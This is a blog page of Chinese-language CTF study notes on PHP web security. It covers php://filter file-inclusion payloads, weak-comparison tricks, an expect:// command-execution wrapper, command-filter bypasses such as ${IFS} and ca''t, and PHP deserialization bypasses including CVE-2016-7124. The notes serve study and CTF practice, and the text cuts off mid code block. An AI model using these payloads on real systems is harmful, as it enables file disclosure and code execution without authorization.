<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="keywords" content="Hexo Theme Redefine">
    
    <meta name="author" content="mapl3miss">
    <!-- preconnect -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>

    
    <!--- Seo Part-->
    
    <link rel="canonical" href="https://mapl3miss.github.io/2024/10/20/php/"/>
    <meta name="robots" content="index,follow">
    <meta name="googlebot" content="index,follow">
    <meta name="revisit-after" content="1 days">
    
        <meta name="description" content="PHPfilter伪协议  php:&#x2F;&#x2F;filter&#x2F;过滤器(可以没有)&#x2F;数据源[php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64 encode&#x2F;resource&#x3D;hello.php]  ![26c8067dca4fce61c798889c277dc031](C:\Users\1\P">
<meta property="og:type" content="article">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="https://mapl3miss.github.io/2024/10/20/PHP/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="PHPfilter伪协议  php:&#x2F;&#x2F;filter&#x2F;过滤器(可以没有)&#x2F;数据源[php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64 encode&#x2F;resource&#x3D;hello.php]  ![26c8067dca4fce61c798889c277dc031](C:\Users\1\P">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://s2.loli.net/2024/04/09/394sFvRJkYWAglS.png">
<meta property="og:image" content="https://s2.loli.net/2024/04/09/im4EPGFUnTDd52o.png">
<meta property="og:image" content="https://s2.loli.net/2024/04/09/Amz5WT7IJGrwKL3.png">
<meta property="og:image" content="https://s2.loli.net/2024/04/09/S8lKoWxiAdyDfna.png">
<meta property="og:image" content="https://s2.loli.net/2024/04/09/wrXv7GNB41Amlug.png">
<meta property="og:image" content="https://s2.loli.net/2024/04/10/4YHGV9zljdy67vL.png">
<meta property="og:image" content="https://s2.loli.net/2024/04/10/Ktx4MPXFmGnZ7cS.png">
<meta property="article:published_time" content="2024-10-20T11:24:23.048Z">
<meta property="article:modified_time" content="2024-09-28T09:59:28.727Z">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://s2.loli.net/2024/04/09/394sFvRJkYWAglS.png">
    
    
    <!--- Icon Part-->
    <link rel="icon" type="image/png" href="/images/avatar.jpg" sizes="192x192">
    <link rel="apple-touch-icon" sizes="180x180" href="/images/avatar.jpg">
    <meta name="theme-color" content="#0066cc">
    <link rel="shortcut icon" href="/images/avatar.jpg">
    <!--- Page Info-->
    
    <title>
        
        Mapl3miss&#39;s blog
    </title>

    
<link rel="stylesheet" href="/fonts/Chillax/chillax.css">


    <!--- Inject Part-->
    

    
<link rel="stylesheet" href="/css/style.css">


    
        
<link rel="stylesheet" href="/assets/build/styles.css">

    

    
<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">

    
<link rel="stylesheet" href="/fonts/Geist/geist.css">

    <!--- Font Part-->
    
    
    
    
    
    

    <script id="hexo-configurations">
    window.config = {"hostname":"mapl3miss.github.io","root":"/","language":"en"};
    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#0066cc","secondary":"#0066cc","default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":true},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Mapl3miss","subtitle":{"text":[],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.7.1","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2022/8/17 11:45:14"};
    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
    window.data = {"masonry":false};
  </script>
    
    <!--- Fontawesome Part-->
    
<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">

    
<link rel="stylesheet" href="/fontawesome/brands.min.css">

    
<link rel="stylesheet" href="/fontawesome/solid.min.css">

    
<link rel="stylesheet" href="/fontawesome/regular.min.css">

    
    
    
    
<meta name="generator" content="Hexo 7.3.0"></head>


<body>
<div class="progress-bar-container">
    

    
        <span class="pjax-progress-bar"></span>
<!--        <span class="swup-progress-icon">-->
<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
<!--        </span>-->
    
</div>



<main class="page-container" id="swup">

    

    <div class="main-content-container">


        <div class="main-content-header">
            <header class="navbar-container px-6 md:px-12">

    <div class="navbar-content ">
        <div class="left">
            
            <a class="logo-title" href="/">
                
                Mapl3miss&#39;s blog
                
            </a>
        </div>

        <div class="right">
            <!-- PC -->
            <div class="desktop">
                <ul class="navbar-list">
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/"
                                        >
                                    <i class="fa-regular fa-house fa-fw"></i>
                                    HOME
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                    
                </ul>
            </div>
            <!-- Mobile -->
            <div class="mobile">
                
                <div class="icon-item navbar-bar">
                    <div class="navbar-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <!-- Mobile sheet -->
    <div class="navbar-drawer h-screen w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/"
                        >
                            <span>
                                HOME
                            </span>
                            
                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            

            
            
        </ul>

        <div class="statistics flex justify-around my-2.5">
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">0</div>
        <div class="label text-third-text-color text-sm">Tags</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">0</div>
        <div class="label text-third-text-color text-sm">Categories</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">2</div>
        <div class="label text-third-text-color text-sm">Posts</div>
    </a>
</div>
    </div>

    <div class="window-mask"></div>

</header>


        </div>

        <div class="main-content-body">

            

            <div class="main-content">

                
                    <div class="post-page-container flex relative justify-between box-border w-full h-full">
    <div class="article-content-container">

        <div class="article-title relative w-full">
            
                <div class="w-full flex items-center pt-6 justify-start">
                    <h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3"></h1>
                </div>
            
            </div>

        
            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
                    <img src="/images/avatar.jpg">
                </div>
                <div class="info flex flex-col justify-between">
                    <div class="author flex items-center">
                        <span class="name text-default-text-color text-lg font-semibold">mapl3miss</span>
                        
                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv1</span>
                        
                    </div>
                    <div class="meta-info">
                        <div class="article-meta-info">
    <span class="article-date article-meta-item">
        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
        <span class="desktop">2024-10-20 19:24:23</span>
        <span class="mobile">2024-10-20 19:24:23</span>
        <span class="hover-info">Created</span>
    </span>
    
        <span class="article-date article-meta-item">
            <i class="fa-regular fa-wrench"></i>&nbsp;
            <span class="desktop">2024-09-28 17:59:28</span>
            <span class="mobile">2024-09-28 17:59:28</span>
            <span class="hover-info">Updated</span>
        </span>
    

    
    

    
    
    
    
        <span class="article-pv article-meta-item">
            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
        </span>
    
</div>

                    </div>
                </div>
            </div>
        

        


        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
            <h1 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h1><h2 id="filter伪协议"><a href="#filter伪协议" class="headerlink" title="filter伪协议"></a><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/wangyuxiang946/article/details/131149171?ops_request_misc=%257B%2522request%255Fid%2522%253A%25229FFED963-CBBB-4BD7-ABDA-3C42EAF98F74%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=9FFED963-CBBB-4BD7-ABDA-3C42EAF98F74&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-131149171-null-null.142%5Ev100%5Econtrol&utm_term=php%E4%B8%BA%E5%8D%8F%E8%AE%AEfilter&spm=1018.2226.3001.4187" >filter伪协议 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></h2><ul>
<li><h4 id="php-filter-过滤器-可以没有-数据源-php-filter-read-convert-base64-encode-resource-hello-php"><a href="#php-filter-过滤器-可以没有-数据源-php-filter-read-convert-base64-encode-resource-hello-php" class="headerlink" title="php:&#x2F;&#x2F;filter&#x2F;过滤器(可以没有)&#x2F;数据源[php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64 encode&#x2F;resource&#x3D;hello.php]"></a>php:&#x2F;&#x2F;filter&#x2F;过滤器(可以没有)&#x2F;数据源[php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64 encode&#x2F;resource&#x3D;hello.php]</h4></li>
</ul>
<p>![26c8067dca4fce61c798889c277dc031](C:\Users\1\Pictures\Saved Pictures\26c8067dca4fce61c798889c277dc031.png)</p>
<ul>
<li><h4 id="过滤器的read-write可以没有-php-filter-convert-base64-encode-resource-hello-php"><a href="#过滤器的read-write可以没有-php-filter-convert-base64-encode-resource-hello-php" class="headerlink" title="过滤器的read&#x2F;write可以没有     [  php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;hello.php  ]"></a>过滤器的read&#x2F;write可以没有     [  php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;hello.php  ]</h4></li>
<li><h4 id="include-‘php-filter-resource-hello-php’-等同于-include-‘hello-php’"><a href="#include-‘php-filter-resource-hello-php’-等同于-include-‘hello-php’" class="headerlink" title="include(‘php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;hello.php’) 等同于 include(‘hello.php’)"></a>include(‘php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;hello.php’) 等同于 include(‘hello.php’)</h4></li>
<li><h4 id="文件路径应该是相对于当前工作目录或是一个绝对路径。"><a href="#文件路径应该是相对于当前工作目录或是一个绝对路径。" class="headerlink" title="文件路径应该是相对于当前工作目录或是一个绝对路径。"></a>文件路径应该是相对于当前工作目录或是一个绝对路径。</h4></li>
<li><h4 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h4><p>&#x2F;&#x2F;明文读取</p>
<p>index.php?file1&#x3D;php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;file.txt</p>
<p>&#x2F;&#x2F;编码读取</p>
<p>index.php?file1&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;file.txt</p>
</li>
<li><h4 id="写入文件"><a href="#写入文件" class="headerlink" title="写入文件"></a>写入文件</h4><p>&#x2F;&#x2F;明文写入</p>
<p>index.php?file2&#x3D;php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;test.txt&amp;txt&#x3D;helloworld</p>
<p>&#x2F;&#x2F;编码写入</p>
<p>index.php?file2&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-encode&#x2F;resource&#x3D;test.txt&amp;txt&#x3D;helloworld</p>
</li>
</ul>
<p>##ROT13（otate by 13 places）也叫回转13位，是一种替换式密码。</p>
<p>ROT13会把每一个字母替换成13位之后的字母，也就是把a换成n，b换成o，以此类推；如果超过了26个字母的范围，就会从开头重新开始。</p>
<h2 id="弱比较"><a href="#弱比较" class="headerlink" title="弱比较"></a>弱比较</h2><h5 id="php中其中两种比较符号"><a href="#php中其中两种比较符号" class="headerlink" title="php中其中两种比较符号:"></a>php中其中两种比较符号:</h5><p>&#x3D;&#x3D;：先将字符串类型转化成相同，再比较<br>&#x3D;&#x3D;&#x3D;：先判断两种字符串的类型是否相等，再比较</p>
<h5 id="字符串和数字比较使用-时-字符串会先转换为数字类型再比较"><a href="#字符串和数字比较使用-时-字符串会先转换为数字类型再比较" class="headerlink" title="字符串和数字比较使用&#x3D;&#x3D;时,字符串会先转换为数字类型再比较"></a>字符串和数字比较使用&#x3D;&#x3D;时,字符串会先转换为数字类型再比较</h5><p>var_dump(‘a’ &#x3D;&#x3D; 0);&#x2F;&#x2F;true，此时a字符串类型转化成数字，因为a字符串开头中没有找到数字，所以转换为0<br>var_dump(‘123a’ &#x3D;&#x3D; 123);&#x2F;&#x2F;true，这里’123a’会被转换为123</p>
<p>var_dump(‘a123’ &#x3D;&#x3D; 123);&#x2F;&#x2F;false，因为php中有这样一个规定：字符串的开始部分决定了它的值，如果该字符串以合法的数字开始，则使用该数字至和它连续的最后一个数字结束，否则其比较时整体值为0。<br>举例：<br>var_dump(‘123a1’ &#x3D;&#x3D; 123);&#x2F;&#x2F;true<br>var_dump(‘1233a’ &#x3D;&#x3D; 123);&#x2F;&#x2F;false</p>
<h6 id="、-都存在和-相同的弱类型"><a href="#、-都存在和-相同的弱类型" class="headerlink" title="&lt;、&gt;、&lt;&#x3D;、&gt;&#x3D;都存在和&#x3D;&#x3D;相同的弱类型"></a>&lt;、&gt;、&lt;&#x3D;、&gt;&#x3D;都存在和&#x3D;&#x3D;相同的弱类型</h6><h2 id="其他伪协议"><a href="#其他伪协议" class="headerlink" title="其他伪协议"></a>其他伪协议</h2><ol>
<li><h5 id="php-input"><a href="#php-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h5></li>
</ol>
<p>  这个伪协议允许你访问 PHP 脚本的原始输入流。在处理 POST 请求时，你可以使用它来获取请求体中的数据。例如：</p>
<p>$post_data &#x3D; file_get_contents(‘php:&#x2F;&#x2F;input’);<br>这在处理 RESTful API 请求时很有用，因为它允许你直接访问请求的原始 JSON 或其他格式的数据。</p>
<ol start="2">
<li><h5 id="php-output"><a href="#php-output" class="headerlink" title="php:&#x2F;&#x2F;output"></a>php:&#x2F;&#x2F;output</h5></li>
</ol>
<p>  php:&#x2F;&#x2F;output 是一个用于输出的流，可以将数据发送到浏览器或者服务器的输出缓冲区。比如，你可以将内容输出到客户端：</p>
<p>$hello &#x3D; “Hello, World!”;<br>file_put_contents(‘php:&#x2F;&#x2F;output’, $hello);<br>这对于需要直接输出内容而不需要保存到文件的情况非常有用。</p>
<ol start="3">
<li><h5 id="php-stderr"><a href="#php-stderr" class="headerlink" title="php:&#x2F;&#x2F;stderr"></a>php:&#x2F;&#x2F;stderr</h5></li>
</ol>
<p>  php:&#x2F;&#x2F;stderr 允许你将错误消息发送到 Web 服务器的错误日志或者命令行的控制台。这在调试和记录错误时非常有用，例如：</p>
<p>file_put_contents(‘php:&#x2F;&#x2F;stderr’, ‘An error occurred!’);<br>4. ##### php:&#x2F;&#x2F;temp 和 php:&#x2F;&#x2F;memory</p>
<p>  php:&#x2F;&#x2F;temp 和 php:&#x2F;&#x2F;memory 是两个用于创建临时数据流的伪协议。</p>
<p>php:&#x2F;&#x2F;temp 用于创建临时文件，适用于大型数据。<br>php:&#x2F;&#x2F;memory 则将数据保存在内存中，适用于小型数据。<br>这些伪协议在需要临时存储数据但不想在文件系统中留下痕迹时非常有用。</p>
<ol start="5">
<li><h5 id="compress-zlib-和-compress-bzip2"><a href="#compress-zlib-和-compress-bzip2" class="headerlink" title="compress.zlib:&#x2F;&#x2F; 和 compress.bzip2:&#x2F;&#x2F;"></a>compress.zlib:&#x2F;&#x2F; 和 compress.bzip2:&#x2F;&#x2F;</h5></li>
</ol>
<p>  这两个伪协议允许你读写压缩过的数据流。比如：</p>
<p>$compressed_data &#x3D; file_get_contents(‘compress.zlib:&#x2F;&#x2F;path&#x2F;to&#x2F;compressed&#x2F;file.gz’);<br>这使得处理压缩文件变得更加方便。</p>
<ol start="6">
<li><h5 id="expect"><a href="#expect" class="headerlink" title="expect:&#x2F;&#x2F;"></a>expect:&#x2F;&#x2F;</h5></li>
</ol>
<p>  expect:&#x2F;&#x2F; 伪协议可以让你直接执行一个外部命令，并返回其输出。但是需要格外小心使用，因为它容易受到命令注入的攻击。</p>
<p>$output &#x3D; file_get_contents(‘expect:&#x2F;&#x2F;ls -la’);<br>7. ##### glob:&#x2F;&#x2F;</p>
<p>  glob:&#x2F;&#x2F; 伪协议允许你像使用 glob() 函数一样列出匹配的文件。比如：</p>
<p>foreach (glob(‘glob:&#x2F;&#x2F;path&#x2F;to&#x2F;directory&#x2F;*.txt’) as $file) {<br>    echo “$file\n”;<br>}<br>这样可以方便地处理文件系统中的多个文件。</p>
<ol start="8">
<li><h5 id="phar"><a href="#phar" class="headerlink" title="phar:&#x2F;&#x2F;"></a>phar:&#x2F;&#x2F;</h5></li>
</ol>
<p>  phar:&#x2F;&#x2F; 伪协议允许你像处理压缩归档文件一样处理 PHAR (PHP Archive) 文件。比如：</p>
<p>$phar &#x3D; new Phar(‘phar:&#x2F;&#x2F;path&#x2F;to&#x2F;archive.phar’);<br>这在处理自包含的 PHP 应用程序或者库时非常有用。</p>
<h2 id="data伪协议"><a href="#data伪协议" class="headerlink" title="data伪协议"></a>data伪协议</h2><h2 id="array-search函数（遍历数组找对应值）"><a href="#array-search函数（遍历数组找对应值）" class="headerlink" title="array_search函数（遍历数组找对应值）"></a>array_search函数（遍历数组找对应值）</h2><p>采用的是若比较，即&#x3D;&#x3D;，在php中’字符串’&#x3D;&#x3D;0是成立的</p>
<p>例.array_search(“DGGJ”,$c[“n”])如果n&#x3D;0或数组n中有元素等于0，返回值即为1</p>
<h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><p>空格&#x3D;${IFS}</p>
<p>&#x2F;&#x3D;$printf(${IFS}”\57”)</p>
<p>字符串中间加“”没影响（cat&#x3D;ca””t）</p>
<h2 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h2><table>
<thead>
<tr>
<th>魔术方法</th>
<th>调用时机</th>
</tr>
</thead>
<tbody><tr>
<td>__construct ()</td>
<td>实例化时调用</td>
</tr>
<tr>
<td>__destrct()</td>
<td>销毁时调用</td>
</tr>
<tr>
<td>__call()</td>
<td>在对象中调用一个不可访问方法时</td>
</tr>
<tr>
<td>__callStatic()</td>
<td>在静态上下文中调用一个不可访问方法时</td>
</tr>
<tr>
<td>__get()</td>
<td>读取不可访问（protected 或 private）或不存在的属性的值时</td>
</tr>
<tr>
<td>__set()</td>
<td>给不可访问（protected 或 private）或不存在的属性赋值时</td>
</tr>
<tr>
<td>__isset()</td>
<td>对不可访问（protected 或 private）或不存在的属性调用 isset() 或 empty() 时</td>
</tr>
<tr>
<td>__unset()</td>
<td>对不可访问（protected 或 private）或不存在的属性调用 unset() 时</td>
</tr>
<tr>
<td>__sleep()</td>
<td>执行 serialize() 时</td>
</tr>
<tr>
<td>__wakeup()</td>
<td>执行 unserialize() 时</td>
</tr>
<tr>
<td>__toString()</td>
<td>把类当成字符串时</td>
</tr>
<tr>
<td>__invoke()</td>
<td>把对象当成函数调用时</td>
</tr>
<tr>
<td>__debugInfo()</td>
<td>使用 var_dump, print_r 时</td>
</tr>
<tr>
<td>__set_state()</td>
<td>调用var_export()导出类时</td>
</tr>
<tr>
<td>__clone()</td>
<td>当对象复制完成时</td>
</tr>
<tr>
<td>__autoload()</td>
<td>尝试加载未定义的类</td>
</tr>
</tbody></table>
<p>下面还有两个特殊的魔术方法<code>__serialize() ``__unserialize()</code></p>
<p><code>serialize()</code> 函数会检查类中是否存在一个魔术方法 <code>__serialize()</code> 。如果存在，该方法将在任何序列化之前优先执行。它必须以一个代表对象序列化形式的 键&#x2F;值 成对的关联数组形式来返回，如果没有返回数组，将会抛出一个 <code>TypeError</code> 错误。</p>
<blockquote>
<p><strong>注意</strong>:</p>
<p>如果类中同时定义了 <code>__serialize()</code> 和 <code>__sleep()</code> 两个魔术方法，则只有 <code>__serialize()</code> 方法会被调用。 <code>__sleep()</code> 方法会被忽略掉。如果对象实现了 <code>Serializable</code> 接口，接口的 <code>serialize()</code> 方法会被忽略，做为代替类中的 <code>__serialize()</code> 方法会被调用</p>
</blockquote>
<p><code>__serialize()</code> 的预期用途是定义对象序列化友好的任意表示。 数组的元素可能对应对象的属性，但是这并不是必须的。</p>
<p>相反，<code>unserialize()</code> 检查是否存在具有名为 <code>__unserialize()</code> 的魔术方法。此函数将会传递从 <code>__serialize()</code> 返回的恢复数组。然后它可以根据需要从该数组中恢复对象的属性</p>
<blockquote>
<p><strong>注意</strong>:</p>
<p>如果类中同时定义了 <code>__unserialize()</code> 和 <code>__wakeup()</code> 两个魔术方法，则只有 <code>__unserialize()</code> 方法会生效，<code>__wakeup()</code> 方法会被忽略</p>
</blockquote>
<blockquote>
<p><strong>注意</strong>:</p>
<p>此特性自 PHP 7.4.0 起可用</p>
</blockquote>
<h3 id="反序列化绕过"><a href="#反序列化绕过" class="headerlink" title="# 反序列化绕过"></a><a class="link"   target="_blank" rel="noopener" href="https://fc04db.github.io/2024/04/09/PHP-Unserialize/#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%95%E8%BF%87" ># <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 反序列化绕过</h3><h4 id="php7-1-反序列化对类属性不敏感"><a href="#php7-1-反序列化对类属性不敏感" class="headerlink" title="# php7.1 + 反序列化对类属性不敏感"></a><a class="link"   target="_blank" rel="noopener" href="https://fc04db.github.io/2024/04/09/PHP-Unserialize/#php71%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%B9%E7%B1%BB%E5%B1%9E%E6%80%A7%E4%B8%8D%E6%95%8F%E6%84%9F" ># <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> php7.1 + 反序列化对类属性不敏感</h4><ul>
<li><code>private</code> 使用：私有的类的名称 (考虑到继承的情况) 和字段名组合 <code>\x00类名称\x00字段名</code></li>
<li><code>protected</code> 使用: <code>*</code> 和字段名组合 <code>\x00*\x00字段名</code></li>
</ul>
<p>我们前面说了如果变量前是 protected，序列化结果会在变量名前加上 <code>\x00*\x00</code></p>
<p>但在特定版本 7.1 以上则对于类属性不敏感，比如下面的例子即使没有 <code>\x00*\x00</code> 也依然会输出 <code>abc</code></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class test&#123;</span><br><span class="line">    protected $a;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;a = &#x27;abc&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function  __destruct()&#123;</span><br><span class="line">        echo $this-&gt;a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">unserialize(&#x27;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#x27;);</span><br></pre></td></tr></table></figure></div>

<h4 id="绕过-wakeup-CVE-2016-7124"><a href="#绕过-wakeup-CVE-2016-7124" class="headerlink" title="# 绕过__wakeup (CVE-2016-7124)"></a><a class="link"   target="_blank" rel="noopener" href="https://fc04db.github.io/2024/04/09/PHP-Unserialize/#%E7%BB%95%E8%BF%87__wakeupcve-2016-7124" ># <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 绕过__wakeup (CVE-2016-7124)</h4><p>版本：</p>
<blockquote>
<p>PHP5 &lt; 5.6.25</p>
<p>PHP7 &lt; 7.0.10</p>
</blockquote>
<p>利用方式：序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup 的执行</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class test&#123;</span><br><span class="line">    public $a;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;a = &#x27;abc&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        $this-&gt;a=&#x27;666&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function  __destruct()&#123;</span><br><span class="line">        echo $this-&gt;a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>如果执行 <code>unserialize(&#39;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#39;);</code> 输出结果为 <code>666</code></p>
<p>而把对象属性个数的值增大执行 <code>unserialize(&#39;O:4:&quot;test&quot;:2&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#39;);</code> 输出结果为 abc</p>
<h4 id="绕过部分正则"><a href="#绕过部分正则" class="headerlink" title="# 绕过部分正则"></a><a class="link"   target="_blank" rel="noopener" href="https://fc04db.github.io/2024/04/09/PHP-Unserialize/#%E7%BB%95%E8%BF%87%E9%83%A8%E5%88%86%E6%AD%A3%E5%88%99" ># <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 绕过部分正则</h4><p><code>preg_match(&#39;/^O:\d+/&#39;)</code> 匹配序列化字符串是否是对象字符串开头，这在曾经的 CTF 中也出过类似的考点</p>
<blockquote>
<p>・利用加号绕过（注意在 url 里传参时 + 要编码为 %2B）<br>・serialize (array (a) ) ; &#x2F;&#x2F; a));&#x2F;&#x2F;a));&#x2F;&#x2F;a 为要反序列化的对象 (序列化结果开 头是 a，不影响作为数组元素的 $a 的析构)</p>
</blockquote>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class test&#123;</span><br><span 